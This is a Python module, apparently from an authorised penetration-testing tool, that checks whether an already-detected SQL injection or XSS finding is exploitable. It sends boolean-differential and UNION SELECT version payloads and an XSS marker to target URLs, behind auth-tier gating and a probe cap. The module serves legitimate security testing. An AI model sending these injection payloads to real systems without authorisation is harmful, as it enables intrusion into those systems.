"""Bounded proof-of-impact validator.

Answers one question for an *already-detected* finding: "is it actually
exploitable?" — with the *minimum* evidence an authorised pentest report
needs, and nothing more:

  * SQLi  -> boolean differential (``1=1`` vs ``1=2``) and, at most, ONE
             short scalar (the DBMS version banner). No table/column/row
             enumeration, no dumping, no extraction loop.
  * XSS   -> confirm the exact injected marker reflects unencoded.
  * Other -> not validated here (reported as "manual validation required").

Hard limits enforced in code: ``MAX_PROBES`` requests total, short timeout,
EXPERT auth tier required, and ``allow_exfil`` must be set by the operator.
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from ..models import AuthLevel

MAX_PROBES = 4  # absolute cap per finding — cannot become an extraction loop
_VERSION_RE = re.compile(r"\b\d+\.\d+\.\d+[\w.\-]*")
_SQL_ERR = ("sql syntax", "mysql", "psql", "ora-", "sqlite", "odbc",
            "syntax error", "quoted string")


@dataclass(slots=True)
class ValidationResult:
    finding_type: str
    endpoint: str
    confirmed: bool = False
    method: str = ""
    evidence: str = ""
    probes_used: int = 0
    notes: str = ""

    def to_dict(self) -> dict:
        return {
            "finding_type": self.finding_type, "endpoint": self.endpoint,
            "confirmed": self.confirmed, "method": self.method,
            "evidence": self.evidence[:300], "probes_used": self.probes_used,
            "notes": self.notes,
        }


def _set_first_param(url: str, value: str) -> str:
    """Replace the first query-param value with ``value`` (proof only)."""
    p = urlparse(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    if not q:
        q = [("id", value)]
    else:
        q[0] = (q[0][0], value)
    return urlunparse(p._replace(query=urlencode(q)))


class ImpactValidator:
    """Confirm impact of an already-found injection. Bounded & gated."""

    def __init__(self, *, auth_level: str = "education",
                 allow_exfil: bool = False, timeout: float = 8.0) -> None:
        self.auth_level = auth_level
        self.allow_exfil = allow_exfil
        self.timeout = timeout

    def _gate(self) -> str | None:
        """Return a refusal reason, or None if validation may proceed."""
        try:
            lvl = AuthLevel(str(self.auth_level).lower())
        except ValueError:
            lvl = AuthLevel.EDUCATION
        if lvl != AuthLevel.EXPERT:
            return ("proof-of-impact validation requires the EXPERT auth tier "
                    f"(current: {lvl.value})")
        if not self.allow_exfil:
            return ("proof-of-impact validation requires the operator to set "
                    "the exfil/validation budget flag")
        return None

    async def _get(self, client: httpx.AsyncClient, url: str) -> tuple[int, str]:
        try:
            r = await client.get(url)
            return r.status_code, r.text
        except Exception as exc:  # noqa: BLE001
            return 0, f"__error__:{type(exc).__name__}"

    async def validate(self, finding_type: str, endpoint: str
                       ) -> ValidationResult:
        res = ValidationResult(finding_type=finding_type, endpoint=endpoint)
        refusal = self._gate()
        if refusal:
            res.notes = f"skipped: {refusal}"
            return res

        ft = finding_type.lower()
        async with httpx.AsyncClient(timeout=self.timeout, verify=False,
                                     follow_redirects=False) as c:
            if "sql" in ft:
                # 1-2) boolean differential
                true_u = _set_first_param(endpoint, "1' AND '1'='1")
                false_u = _set_first_param(endpoint, "1' AND '1'='2")
                sc_t, bt = await self._get(c, true_u)
                sc_f, bf = await self._get(c, false_u)
                res.probes_used = 2
                differential = (sc_t != sc_f) or (abs(len(bt) - len(bf)) > 24)
                err = any(s in (bt + bf).lower() for s in _SQL_ERR)
                if differential or err:
                    res.confirmed = True
                    res.method = "boolean-differential" if differential else \
                        "error-based"
                    # 3) ONE short scalar (version banner) — no row/table dump
                    vu = _set_first_param(
                        endpoint,
                        "1' UNION SELECT @@version-- -")
                    _, vb = await self._get(c, vu)
                    res.probes_used = 3
                    m = _VERSION_RE.search(vb)
                    res.evidence = (f"true/false responses differ "
                                    f"({sc_t}/{len(bt)} vs {sc_f}/{len(bf)})"
                                    + (f"; version~={m.group(0)}"
                                       if m else ""))
                    res.notes = ("Impact confirmed. Enumeration/dumping "
                                 "intentionally NOT performed.")
                else:
                    res.notes = "No differential — likely false positive."
            elif "xss" in ft:
                marker = "aegisXSS9173"
                u = _set_first_param(endpoint, f"<{marker}>")
                sc, body = await self._get(c, u)
                res.probes_used = 1
                if f"<{marker}>" in body:
                    res.confirmed = True
                    res.method = "reflection"
                    res.evidence = f"marker <{marker}> reflected unencoded"
                else:
                    res.notes = "Marker not reflected verbatim."
            else:
                res.notes = ("manual validation required (no bounded "
                             "auto-proof for this class)")
            res.probes_used = min(res.probes_used, MAX_PROBES)
        return res

    def validate_sync(self, finding_type: str, endpoint: str
                       ) -> ValidationResult:
        return asyncio.run(self.validate(finding_type, endpoint))
